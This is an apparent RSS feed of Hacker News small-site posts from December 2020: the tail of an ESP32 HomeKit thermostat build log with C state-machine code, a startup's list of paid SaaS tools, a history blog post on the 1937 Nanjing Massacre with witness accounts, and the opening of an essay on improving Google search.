    TC_HEATER_MODE_AUTO_ON,
    TC_HEATER_MODE_AUTO_OFF
} tc_heater_mode_t;

typedef enum {
    TC_HEATER_ACTIONS_SET_TO_AUTO,
    TC_HEATER_ACTIONS_SET_TO_OFF,
    TC_HEATER_ACTIONS_SET_TO_ON,
    TC_HEATER_ACTIONS_TEMPERATURE_CHANGE,
    TC_HEATER_ACTIONS_THRESHOLD_CHANGE
} tc_heater_action_t;

// ... Somewhere else:

switch (s_current_heater_mode) {
    case TC_HEATER_MODE_OFF:
        switch(tc_action) {
            case TC_HEATER_ACTIONS_SET_TO_AUTO:
                s_current_heater_mode = TC_HEATER_MODE_AUTO_OFF;
                s_current_heater_mode = tc_update_auto_mode(s_current_heater_mode);
                break;
            case TC_HEATER_ACTIONS_SET_TO_OFF:
                break;
            case TC_HEATER_ACTIONS_SET_TO_ON:
                s_current_heater_mode = TC_HEATER_MODE_ON;
                break;
            case TC_HEATER_ACTIONS_TEMPERATURE_CHANGE:
                break;
            case TC_HEATER_ACTIONS_THRESHOLD_CHANGE:
                break;
        }
        break;
    case TC_HEATER_MODE_ON:
        switch(tc_action) {
            case TC_HEATER_ACTIONS_SET_TO_AUTO:
                s_current_heater_mode = TC_HEATER_MODE_AUTO_ON;
                s_current_heater_mode = tc_update_auto_mode(s_current_heater_mode);
                break;
            case TC_HEATER_ACTIONS_SET_TO_OFF:
                s_current_heater_mode = TC_HEATER_MODE_OFF;
                break;
            case TC_HEATER_ACTIONS_SET_TO_ON:
                break;
            case TC_HEATER_ACTIONS_TEMPERATURE_CHANGE:
                break;
            case TC_HEATER_ACTIONS_THRESHOLD_CHANGE:
                break;
        }
        break;
    case TC_HEATER_MODE_AUTO_ON:
    case TC_HEATER_MODE_AUTO_OFF:
        switch(tc_action) {
            case TC_HEATER_ACTIONS_SET_TO_AUTO:
                break;
            case TC_HEATER_ACTIONS_SET_TO_OFF:
                s_current_heater_mode = TC_HEATER_MODE_OFF;
                break;
            case TC_HEATER_ACTIONS_SET_TO_ON:
                s_current_heater_mode = TC_HEATER_MODE_ON;
                break;
            case TC_HEATER_ACTIONS_TEMPERATURE_CHANGE:
                s_current_heater_mode = tc_update_auto_mode(s_current_heater_mode);
                break;
            case TC_HEATER_ACTIONS_THRESHOLD_CHANGE:
                s_current_heater_mode = tc_update_auto_mode(s_current_heater_mode);
                break;
        }
        break;
}</code></pre>
</div>

<p>It was very important to me that the thermostat worked on homekit, thankfully
there are already great homekit (hap) resources for the esp32. After some digging
I decided on this homekit package, as it√¢‚Ç¨‚Ñ¢s a clean port of the expressif homekit
library to arduino. There are about 15 different homekit frameworks for arduino,
so at some point I just had to choose one and start running.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/09e7eb514a6c9878988e3897b1f9377a39d331c7/9fc55/images/homekit_thermostat/homekit.jpeg" alt="Homekit screenshot showing thermostat"></p>

<p>After a whole bunch of fucking around I managed to get my esp32 to show up as a thermostat from my phone.</p>

<p>A few gotcha√¢‚Ç¨‚Ñ¢s that I encountered along the way: (some specific to this library, some specific to homekit)</p>

<ul>
  <li>With this HomeKit library if you want to factory reset, you have to do it <em>after</em> you initialize. Also be sure to remove the device from homekit on your phone before factory resetting the device</li>
  <li>Be sure that you have unique id and pairing codes for your device, I have another esp32 on my homekit and they kept colliding</li>
  <li>Be sure that your device cid matches with the services you are providing, otherwise you will get annoying silent failures from homekit</li>
</ul>



<h2 id="making-things-pretty">Making things pretty</h2>

<p>After getting the code into a place I liked, all that was left was to make it
look less like a bomb strapped to my living room wall. I 3d printed an enclosure,
and soldered the correct wires in the correct places. Unfortunately my board
requires constant a 5V micro-usb power source, so as of right now I have it
powered off of a huge battery pack. Maybe in vN (for very large values of N)
I will go nest style with an internal LiPo and an AC-DC converter.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/da9845e5838dba97dbae170da8ae49eb191c9b6f/089ad/images/homekit_thermostat/soldered.jpeg" alt="Soldered together">
<img src="https://d33wubrfki0l68.cloudfront.net/a2686592824334db4590b4affc52e706eb1acd91/cfae7/images/homekit_thermostat/enclosure.jpeg" alt="3d printed enclosure">
<img src="https://d33wubrfki0l68.cloudfront.net/3d6c45942a18d64daa989a8b0baf0f3ab706a833/aa250/images/homekit_thermostat/pretty.jpeg" alt="Enclosure mounted to wall and plugged in"></p>



<h2 id="whats-next">What√¢‚Ç¨‚Ñ¢s Next?</h2>

<p>I have already bought a few parts for a planned v2, so stay tuned. In v2 I will be adding:</p>

<ul>
  <li>New thermometer board (Going to use this overpriced adafruit breakout here <a href="https://www.amazon.com/gp/product/B00OKCQX96/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&amp;psc=1">https://www.amazon.com/gp/product/B00OKCQX96/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&amp;psc=1</a>)</li>
  <li>Adding a small status display OLED screen <a href="https://www.amazon.com/gp/product/B0833PF7ML/ref=ppx_yo_dt_b_asin_title_o01_s03?ie=UTF8&amp;psc=1">https://www.amazon.com/gp/product/B0833PF7ML/ref=ppx_yo_dt_b_asin_title_o01_s03?ie=UTF8&amp;psc=1</a></li>
  <li>Add a few buttons to allow non-phone control of the device <a href="https://www.amazon.com/gp/product/B0722LBKV7/ref=ppx_yo_dt_b_asin_title_o01_s00?ie=UTF8&amp;psc=1">https://www.amazon.com/gp/product/B0722LBKV7/ref=ppx_yo_dt_b_asin_title_o01_s00?ie=UTF8&amp;psc=1</a></li>
</ul>

<div>
    <p>

    Thanks for reading! If you want to stay updated feel free to follow the <a href="https://staycaffeinated.com/feed.xml">RSS feed</a>, if you have any suggestions feel free to email me at <a href="mailto:mdl0394@gmail.com">mdl0394@gmail.com</a></p><p>
    

    You could also submit your email here, and I will personally email you whenever I post new things:

    </p>
</div>

<h2 id="parts-used--other-references">Parts used / Other references</h2>

<ul>
  <li>Way too big of a relay: <a href="https://www.amazon.com/gp/product/B07KXNCL91/ref=ppx_yo_dt_b_asin_title_o08_s00?ie=UTF8&amp;psc=1">https://www.amazon.com/gp/product/B07KXNCL91/ref=ppx_yo_dt_b_asin_title_o08_s00?ie=UTF8&amp;psc=1</a></li>
  <li>ESP32 Doit Devkit v1 boards: <a href="https://www.amazon.com/gp/product/B07Q576VWZ/ref=ppx_yo_dt_b_asin_title_o08_s01?ie=UTF8&amp;psc=1">https://www.amazon.com/gp/product/B07Q576VWZ/ref=ppx_yo_dt_b_asin_title_o08_s01?ie=UTF8&amp;psc=1</a></li>
  <li>HomeKit framework esp-homekit-arduino-sdk <a href="https://github.com/Brawrdon/esp-homekit-arduino-sdk?utm_source=platformio&amp;utm_medium=piohome">https://github.com/Brawrdon/esp-homekit-arduino-sdk?utm_source=platformio&amp;utm_medium=piohome</a></li>
</ul>

    </div>
</div></div>]]>
            </description>
            <link>https://www.staycaffeinated.com/2020/12/27/building-my-own-homekit-thermostat-v1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25552889</guid>
            <pubDate>Sun, 27 Dec 2020 18:06:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SaaS We Happily Pay For]]>
            </title>
            <description>
<![CDATA[
Score 425 | Comments 213 (<a href="https://news.ycombinator.com/item?id=25552342">thread link</a>) | @frankdilo
<br/>
December 27, 2020 | https://francescodilorenzo.com/saas-we-pay-for | <a href="https://web.archive.org/web/*/https://francescodilorenzo.com/saas-we-pay-for">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>We try to run a lean operation at <a href="https://mailbrew.com/">Mailbrew</a>, but we are suckers for great tools that improve our daily workflows, so we pay for quite a few of them each month.</p>
<p>Being small (just 3 people), the cost of switching services is almost negligible, so we try new stuff regularly and do switch when we see a clear improvement.</p>
<p>Here is a list of everything we <em>happily</em> pay for.</p>
<h3><a href="https://missiveapp.com/">Missive</a></h3>
<p><strong>$15/month ‚®â 3 = $45/month.</strong></p>
<p>Collaborative email on top of G Suite. The main thing we pay for is a comment box below each email thread. It allows us to quickly discuss emails without forwarding or copy/pasting in Slack. It also allows us to edit drafts collaboratively and have multiple team inboxes for invoices, support, and other stuff.</p>
<p>We pay for the Productive plan because of one feature: Rules. They allow us to automatically categorize emails and be more granular with notifications. </p>
<h3><a href="https://www.notion.so/product">Notion</a></h3>
<p><strong>$8/month ‚®â 3 = $24/month.</strong></p>
<p>It's our team wiki. We write memos, meeting notes, drafts for blog posts, and everything that needs to be shared async for feedback. We also used to put tasks here but recently moved to Linear (more on this below).</p>
<p>It's an amazing value, but we were close to ditching it because of how slow it has become. We still have to find something that delivers the same great feature set and flexibility while improving speed and reliability.</p>
<h3><a href="https://linear.app/">Linear</a></h3>
<p><strong>$8/month ‚®â 3 = $24/month.</strong></p>
<p>We put our tasks here. It's a newcomer, but it's so good that we have already committed to it for a year. </p>
<p>It completely revolutionized the way we work with its flexibility, speed, customizability, and great GitHub integration.</p>
<p>If you connect it to GitHub and open a pull request with a task-specific name, task and PR get linked. When the PR is merged, the task is automatically marked as done.</p>
<p>I would invest in this company if I had the chance. It's so much better than everything else I ever tried in this space.</p>
<h3><a href="https://vercel.com/">Vercel</a></h3>
<p><strong>$20/month ‚®â 3 = $60/month.</strong></p>
<p>Vercel deploys and hosts our frontends and serverless functions.</p>
<p>It's a bit pricier than we'd like, and the pricing does not really make sense. Why do we have to pay per team member instead of build minutes, bandwidth, and compute?</p>
<p>With all that being said, we love the product philosophy, simplicity, and integration with GitHub. Having automatic deploys for all commits, together with automatic task-linking to Linear for PRs, is code-review Nirvana.</p>
<h3><a href="https://savvycal.com/">SavvyCal</a></h3>
<p><strong>$12/month ‚®â 2 = $24/month.</strong></p>
<p>We use it to schedule our calls. It's a better Calendly, made by a solo indie developer that we're happy to support.</p>
<p>The product is super-intuitive, and its feature set is increasing at a great pace with features that massively improve our workflows.</p>
<h3><a href="https://plausible.io/">Plausible Analytics</a></h3>
<p><strong>$12/month.</strong></p>
<p>It's a privacy-focused website analytics tool that replaces Google Analytics.</p>
<p>The most impressive thing is how better the insights we get from it are, thanks to some great UX, despite its privacy-respecting stance.</p>
<p>No surprise, they have been <a href="https://www.indiehackers.com/product/plausible-insights">growing like crazy</a>.</p>
<h3><a href="https://mailbrew.com/">Mailbrew</a></h3>
<p><strong>$10/month.</strong></p>
<p>We pay for this, even if we are the ones making it, to test our Stripe Integration.</p>
<p>We use Mailbrew to receive a couple of digests with dedicated Twitter Searches that keep us updated on social mentions of our product.</p>
<h3><a href="https://super.so/">Super</a></h3>
<p><strong>$12/month.</strong></p>
<p>This turns Notion documents into their own websites with a dedicated domain. We use it for our <a href="https://mailbrew.com/press">press kit</a> and <a href="https://help.mailbrew.com/">support docs</a>.  </p>
</article></div>]]>
            </description>
            <link>https://francescodilorenzo.com/saas-we-pay-for</link>
            <guid isPermaLink="false">hacker-news-small-sites-25552342</guid>
            <pubDate>Sun, 27 Dec 2020 16:59:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remembering the Nanjing Massacre]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 17 (<a href="https://news.ycombinator.com/item?id=25552140">thread link</a>) | @Beggers1960
<br/>
December 27, 2020 | https://ramblinghistory.co.uk/2020/12/11/nanjing-massacre-remembered/ | <a href="https://web.archive.org/web/*/https://ramblinghistory.co.uk/2020/12/11/nanjing-massacre-remembered/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-449">

	<!-- .entry-header -->

	<div>
		


<p><img loading="lazy" data-attachment-id="464" data-permalink="https://ramblinghistory.co.uk/2020/12/11/nanjing-massacre-remembered/ija_10th_army_entering_nanking/" data-orig-file="https://rossk1992.files.wordpress.com/2020/12/ija_10th_army_entering_nanking.jpg" data-orig-size="950,633" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="IJA_10th_Army_entering_Nanking" data-image-description="" data-medium-file="https://rossk1992.files.wordpress.com/2020/12/ija_10th_army_entering_nanking.jpg?w=300" data-large-file="https://rossk1992.files.wordpress.com/2020/12/ija_10th_army_entering_nanking.jpg?w=748" src="https://rossk1992.files.wordpress.com/2020/12/ija_10th_army_entering_nanking.jpg" alt="Nanjing Massacre" width="748" height="498" srcset="https://rossk1992.files.wordpress.com/2020/12/ija_10th_army_entering_nanking.jpg?w=748&amp;h=498 748w, https://rossk1992.files.wordpress.com/2020/12/ija_10th_army_entering_nanking.jpg?w=150&amp;h=100 150w, https://rossk1992.files.wordpress.com/2020/12/ija_10th_army_entering_nanking.jpg?w=300&amp;h=200 300w, https://rossk1992.files.wordpress.com/2020/12/ija_10th_army_entering_nanking.jpg?w=768&amp;h=512 768w, https://rossk1992.files.wordpress.com/2020/12/ija_10th_army_entering_nanking.jpg 950w" sizes="(max-width: 748px) 100vw, 748px"></p>
<p>In 1937, before a shot was even fired in Europe, Imperial Japanese forces were engaged in a long, bloody conflict in China ‚Äì and it is during this period that we catch a glimpse of the atrocities that would stain the 1940s.&nbsp;</p>
<p>The event, or series of events, we are looking at today is the Japanese occupation of Nanjing, commonly referred to as the ‚ÄòRape of Nanjing‚Äô.</p>



<p>Anyone with a modicum of knowledge on the Second World War will know of the atrocities committed by Imperial Japanese forces. Their atrocious treatment of PoW‚Äôs and civilians throughout South East Asia, Oceania and China are well documented. Several years before those times however, when Japanese forces entered Nanjing, they let loose upon the people there.</p>
<h4>Crashing dominoes&nbsp;</h4>
<p>In the weeks preceding the Japanese occuptation of Nanjing, there had been bloody fighting between Chinese forces and Imperial Japanese troops. Indeed, for several years, the Imperial Japanese Army had been involved in a tit-for-tat conflict against both Communist and nationalist Chinese forces.</p>
<p>In August 1937, the <a href="https://en.wikipedia.org/wiki/Battle_of_Shanghai" target="_blank" rel="noopener">Battle of Shangai</a> set into motion a series of events that would lead to disaster for Chinese forces and civilians throughout the country. The Battle of Shanghai was a visceral, bloody engagement for both sides. However, by mid-November, Imperial Japanese forces had captured and subjugated the area.&nbsp;</p>
<figure data-shortcode="caption" id="attachment_462" aria-describedby="caption-attachment-462"><img loading="lazy" data-attachment-id="462" data-permalink="https://ramblinghistory.co.uk/2020/12/11/nanjing-massacre-remembered/japanese_marines_during_the_battle_of_shanghai_1937/" data-orig-file="https://rossk1992.files.wordpress.com/2020/12/japanese_marines_during_the_battle_of_shanghai_1937.jpg" data-orig-size="510,352" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="Japanese_marines_during_the_Battle_of_Shanghai,_1937" data-image-description="" data-medium-file="https://rossk1992.files.wordpress.com/2020/12/japanese_marines_during_the_battle_of_shanghai_1937.jpg?w=300" data-large-file="https://rossk1992.files.wordpress.com/2020/12/japanese_marines_during_the_battle_of_shanghai_1937.jpg?w=510" src="https://rossk1992.files.wordpress.com/2020/12/japanese_marines_during_the_battle_of_shanghai_1937.jpg" alt="" width="510" height="352" srcset="https://rossk1992.files.wordpress.com/2020/12/japanese_marines_during_the_battle_of_shanghai_1937.jpg 510w, https://rossk1992.files.wordpress.com/2020/12/japanese_marines_during_the_battle_of_shanghai_1937.jpg?w=150&amp;h=104 150w, https://rossk1992.files.wordpress.com/2020/12/japanese_marines_during_the_battle_of_shanghai_1937.jpg?w=300&amp;h=207 300w" sizes="(max-width: 510px) 100vw, 510px"><figcaption id="caption-attachment-462">Japanese marines advance during the Battle of Shanghai.</figcaption></figure>
<p>Despite sustaining heavy casualities after weeks of fighting, Japanese forces of the Central China Area Army and 10th Army were ordered to capture the city of Nanjing and the surrounding area. The subsequent advance prompted hysteria among Chinese civilians and military forces, with thousands of the latter desperately trying to avoid capture.&nbsp;</p>
<h4>Cry havoc! and let slip the dogs of war</h4>







<p>Upon entering the city, Japanese forces appear to enter a feral state, abandoning all reason and humanity and embarking on a campaign of terror, abuse and murder against the people of the old Chinese capital.</p>



<p>A truly ghastly affair, and throughout we see sadistic methods and practices by Japanese troops. Groups of individuals were buried alive, some were burned alive, and the lucky ones were simply executed en-masse.</p>



<p>Beheadings were commonplace throughout this event, and there are accounts (although hotly debated) of ‚Äòcontests‚Äô between Japanese officers to see who could behead 100 people in the shortest time.</p>





<p>In 1937, Japanese media covered the story of Toshiaki Mukai and Tsuyoshi Noda of the Japanese 16th Division, who were both vying to reach this goal of 100 beheadings. Throughout the course of the war these two men are alleged to have murdered over 300 people between them, and upon Japan‚Äôs surrender in 1945 the officers were tried and executed for war crimes.</p>



<p>While crimes were being committed against the civilian population, scores of Chinese prisoners of war were ruthlessly executed. The execution of prisoners of war were also particularly sadistic and brutal.</p>



<p>Countless PoW‚Äôs were hanged, shot and beheaded, with many more being buried alive alongside civilians. To this day the number of Chinese PoW‚Äôs executed is still unknown.</p>
<figure data-shortcode="caption" id="attachment_458" aria-describedby="caption-attachment-458"><img loading="lazy" data-attachment-id="458" data-permalink="https://ramblinghistory.co.uk/2020/12/11/nanjing-massacre-remembered/iwane_matsui_rides_into_nanjing/" data-orig-file="https://rossk1992.files.wordpress.com/2020/12/iwane_matsui_rides_into_nanjing.jpg" data-orig-size="498,360" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Iwane_Matsui_rides_into_Nanjing" data-image-description="" data-medium-file="https://rossk1992.files.wordpress.com/2020/12/iwane_matsui_rides_into_nanjing.jpg?w=300" data-large-file="https://rossk1992.files.wordpress.com/2020/12/iwane_matsui_rides_into_nanjing.jpg?w=498" src="https://rossk1992.files.wordpress.com/2020/12/iwane_matsui_rides_into_nanjing.jpg" alt="Nanking Massacre" width="498" height="360" srcset="https://rossk1992.files.wordpress.com/2020/12/iwane_matsui_rides_into_nanjing.jpg 498w, https://rossk1992.files.wordpress.com/2020/12/iwane_matsui_rides_into_nanjing.jpg?w=150&amp;h=108 150w, https://rossk1992.files.wordpress.com/2020/12/iwane_matsui_rides_into_nanjing.jpg?w=300&amp;h=217 300w" sizes="(max-width: 498px) 100vw, 498px"><figcaption id="caption-attachment-458">General Iwane Matsui rides into Nanjing.</figcaption></figure>
<h4>Accounts by westerners</h4>



<p>As hostilities had not yet erupted between western nations and Japan, there were a range of western civilians in the city during this event, and their accounts of the actions of Japanese soldiers are harrowing.</p>



<p>A surgeon, Robert O. Wilson, in the university hospital within the US safety zone, wrote home on several occasions detailing the events unfolding before his eyes.</p>



<p>‚ÄúThe slaughter of civilians is appalling. I could go on for pages telling of cases of rape and brutality almost beyond belief,‚Äù he wrote. ‚ÄúTwo bayoneted corpses are the only survivors of seven street cleaners who were sitting in their headquarters when Japanese soldiers came in without warning and killed five of their number and wounded the two that found their way to the hospital.‚Äù</p>
<p>The Minnie Vautrin Diary detailing atrocities provides some of the most compelling and harrowing accounts of the Nanjing Massacre. Excerpts detailing what she witnessed can be found online, or the diary itself can be purchased.</p>



<p>In her diary she details the callous brutality of Japanese soldiers and, in particular, their treatment of Chinese women.</p>



<p>‚ÄúA woman of almost 50 living down near San Pai Lou.&nbsp;She had three sons and two daughters-in-law. Four nights ago two soldiers came to the door at about 10pm, unable to push the door they forced their way in through a window and found themselves in Liu Lau Tai‚Äôs room.</p>





<p>‚ÄúThey demanded her daughters-in-law and when she refused and started to go for a military police they cut two gashes in her face and one in her heart.&nbsp;She died from these wounds.‚Äù</p>





<h4>Age old barbarism</h4>



<p>Japanese soldiers employed an age old weapon against the people of Nanjing, rape. Assault on women throughout the Nanjing Massacre were widespread and anywhere up to 20,000 women and girls were raped and brutalised.</p>







<p>John Rabe, leader of the Nanjing Safety Zone details his experiences in dealing with these cases during his time in the city.</p>



<p>‚ÄúIn one of the houses in the narrow street behind my garden wall, a woman was raped, and then wounded in the neck with a bayonet. I managed to get an ambulance so we can take her to Kulou Hospital.</p>





<p>‚ÄúLast night up to 1,000 women and girls are said to have been raped, about 100 girls at Ginling College alone.</p>



<p>‚ÄúYou hear nothing but rape. If husbands or brothers intervene, they‚Äôre shot. What you hear and see on all sides is the brutality and bestiality of the Japanese soldiers.‚Äù</p>
<figure data-shortcode="caption" id="attachment_460" aria-describedby="caption-attachment-460"><img loading="lazy" data-attachment-id="460" data-permalink="https://ramblinghistory.co.uk/2020/12/11/nanjing-massacre-remembered/nanking_bodies_1937/" data-orig-file="https://rossk1992.files.wordpress.com/2020/12/nanking_bodies_1937.jpg" data-orig-size="800,559" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Nanking_bodies_1937" data-image-description="" data-medium-file="https://rossk1992.files.wordpress.com/2020/12/nanking_bodies_1937.jpg?w=300" data-large-file="https://rossk1992.files.wordpress.com/2020/12/nanking_bodies_1937.jpg?w=748" src="https://rossk1992.files.wordpress.com/2020/12/nanking_bodies_1937.jpg" alt="Nanjing Massacre" width="748" height="523" srcset="https://rossk1992.files.wordpress.com/2020/12/nanking_bodies_1937.jpg?w=748&amp;h=523 748w, https://rossk1992.files.wordpress.com/2020/12/nanking_bodies_1937.jpg?w=150&amp;h=105 150w, https://rossk1992.files.wordpress.com/2020/12/nanking_bodies_1937.jpg?w=300&amp;h=210 300w, https://rossk1992.files.wordpress.com/2020/12/nanking_bodies_1937.jpg?w=768&amp;h=537 768w, https://rossk1992.files.wordpress.com/2020/12/nanking_bodies_1937.jpg 800w" sizes="(max-width: 748px) 100vw, 748px"><figcaption id="caption-attachment-460">Bodies littered the shore of the Qinhuai River.</figcaption></figure>



<h4>Relenting troops</h4>



<p>In January of 1938, after several weeks of bloodletting, refugees within the safety zones were ordered to return to their homes.</p>



<p>Japanese officials claimed at the time that ‚Äòorder had been restored‚Äô and that daily life were to continue as normal. For the people of Nanjing subjected to relentless bouts of violence, however, life would never be the same again.</p>



<p>As order was gradually restored, the frequency of attacks and atrocities did dissipate.</p>
<h4>Guilt</h4>



<p>General Iwane Matsui, leader of the Japanese Expeditionary Force in China, began to realise the extent of the atrocities being committed by his men in Nanjing ‚Äì albeit too late.</p>



<p>Speaking of his knowledge on the atrocities being committed, he is claimed to have stated to an aide:</p>



<p>‚ÄúI now realise that we have unknowingly wrought a most grievous effect on this city. When I think of the feelings and sentiments of many of my Chinese friends who have fled from Nanjing and of the future of the two countries, I cannot but feel depressed.</p>



<p>‚ÄúI am very lonely and can never get in a mood to rejoice about this victory ‚Ä¶ I personally feel sorry for the tragedies to the people, but the Army must continue unless China repents.</p>



<p>‚ÄúNow, in the winter, the season gives time to reflect. I offer my sympathy, with deep emotion, to a million innocent people.‚Äù</p>



<p>Although an apparent admission of guilt on his part, Matsui‚Äôs lack of action on the issue, his burying of the head in sand, simply allowed the ordeal to continue far longer than it did.</p>



<p>Matsui was recalled to Japan following the massacre and retired. Upon Japan‚Äôs surrender in 1945, he was tried by the International Military Tribunal for the Far East and is executed.</p>



<h4>Aftermath</h4>



<p>The death toll in Nanjing is debated. Contemporary Japanese statistics could be considered laughable, amounting to only several hundred dead. A range of sources estimate that anywhere between 30,000 to 300,000 people were murdered during this month-long tirade of violence.</p>
<p>Modern Chinese sources (in particular the Chinese Government) claim that these numbers range even higher and are, in fact, closer to half-a-million.</p>




<p>The Nanjing War Crimes Tribunal in 1947 stated:</p>



<p>‚ÄúMore than 190,000 mass slaughtered civilians and Chinese soldiers killed by machine gun by the Japanese army, whose corpses have been burned to destroy proof.</p>



<p>‚ÄúBesides, we count more than 150,000 victims of barbarian acts buried by the charity organisations. We thus have a total of more than 300,000 victims.‚Äù</p>



<p>Researchers state that the death toll numbers between 40,000 and 60,000 based on a number of sources from the time, including Red Army statistics and the Nanjing Safety Zone committee.</p>



<p>Regardless of the true number of casualties, the barbarism and horrific nature of this event are beyond comprehension. The callous behaviour of Japanese soldiers is a stain on the tapestry of 20th century history, and this behaviour continued for another several years until Japanese capitulation in the wake of Hiroshima &amp; Nagasaki.</p>


			
			
						</div><!-- .entry-content -->

	<!-- .entry-footer -->

</article></div>]]>
            </description>
            <link>https://ramblinghistory.co.uk/2020/12/11/nanjing-massacre-remembered/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25552140</guid>
            <pubDate>Sun, 27 Dec 2020 16:36:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A New Google]]>
            </title>
            <description>
<![CDATA[
Score 40 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25552030">thread link</a>) | @smusamashah
<br/>
December 27, 2020 | https://dcgross.com/a-new-google | <a href="https://web.archive.org/web/*/https://dcgross.com/a-new-google">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>[TL;DR: Google has gotten bad; we all know it; ideas for a startup making a better Google.]</p> <p>In 2000, Google got popular because hackers realized it was better than Lycos or Excite. This effect is happening again. Early adopters aren‚Äôt using Google anymore.</p> <p>They aren‚Äôt using DuckDuckGo either. They‚Äôre still using Google.com, but differently. To make Google usable, users are adding faux-query modifiers that to supress the ‚Äúgarbage Internet‚Äù.</p> <p>You see this in the typeahead logs.</p> <p><img src="https://dcgross.com/assets/new-google/image6.png" alt=""> <em></em></p><center><em>Products (Reddit)</em></center> <p><img src="https://dcgross.com/assets/new-google/image4.png" alt=""> <em></em></p><center><em>Services (Reddit, Yelp)</em></center> <p><img src="https://dcgross.com/assets/new-google/image1.png" alt=""> <em></em></p><center><em>Movies (Rotten Tomatoes)</em></center> <p><img src="https://dcgross.com/assets/new-google/image5.png" alt=""> <em></em></p><center><em>Even code (Github)</em></center> <p>Interestingly, this doesn‚Äôt work for all categories. <img src="https://dcgross.com/assets/new-google/image3.png" alt=""> <img src="https://dcgross.com/assets/new-google/image2.png" alt=""> <em></em></p><center><em>Recipes don‚Äôt have a ‚ÄúReddit‚Äù equivalent</em></center> <h3 id="query-operators-mean-somethings-broken">Query Operators Mean Something‚Äôs Broken</h3> <p>More advanced users use modifiers like <code>site: filetype: intitle:</code> because adding ‚Äúreddit‚Äù isn‚Äôt strict enough, as spammy websites often manipulate content to win SEO.</p> <p>How about those websites that stuff the year in the title? ‚ÄúReviews UPDATED JANUARY 2020‚Äù are exploiting the fact that customers suffix queries with the year. What those people are trying to command is freshness, not a title match.</p> <p>Something‚Äôs broken, and a tiny share of Google is open for the taking. Obviously attacking incumbents head-on doesn‚Äôt work. Here are two alternative ideas for bootstrapping next-generation search:</p> <h3 id="1-boogle-a-query-reformulator">#1 Boogle, A Query Reformulator</h3> <p>Introducing Boogle, a proxy for Google that‚Äôs just Better Google Search. It‚Äôs a query expander. We predict the correct operators for your query, proxy Google‚Äôs results, and serve. For example:</p> <p><code>query("stripe.js example") -&gt; query("stripe.js example (site:github.com OR site:gitlab.com OR site:..."))</code></p> <p><code>query("is anker charger") -&gt; query("is anker charger (inurl:forum OR site:reddit.com OR ...))"</code></p> <p>Query topic modeling is a rich science with plenty of examples.</p> <p>You‚Äôd almost as fast as Google, never worse, and occasionally better. This will help build the reflex to use you instead. This approach isn‚Äôt that hard to get started with, and might work for the high-end users.</p>  <p>You could go after this vertical by vertical ‚Äì build the <em>best</em> site for electric product search, for travel, for code, etc. A key question is how to build habitual recall to use your product over Google. Amazon and Airbnb both enjoy a huge amount of direct traffic. Some learnings from those:</p> <ul> <li><strong>Stellar mobile destination.</strong> Using Airbnb directly feels more fluid and fun than using Google for Airbnb.</li> <li><strong>The 90% Rule.</strong> To build reflex you need to give me what I want most of the time.** **With Prime, Amazon made it such that we stopped price comparing across other sites; Amazon would get it to us fastest, and that turns out to matter more than price. Most of the time you open Amazon.app, it satisfies.</li> <li><strong>Come for search, stay for something else.</strong> I don‚Äôt think of Airbnb or Amazon as search apps. They help me get things or book homes. You might want to your search app to be a destination for something else. This is where I think community comes in.</li> </ul> <p>Picking a vertical that <em>doesn‚Äôt</em> have strong typeahead completions[1] would help you build community around your search engine. Recipes, fitness, fashion, etc. don‚Äôt have decacorn conglomerates like Github or Reddit. That might mean it‚Äôs easier to build community around them, and put your flagship search engine on top.</p> <hr> <p>If you‚Äôre working on this kind of stuff, try out <a href="https://pioneer.app/">Pioneer</a> or just shoot me an email ‚Äì daniel@pioneer.app.</p> <hr> <p>[1] In reality I‚Äôd pick the vertical _I _love most. If you‚Äôre a guitar player start with 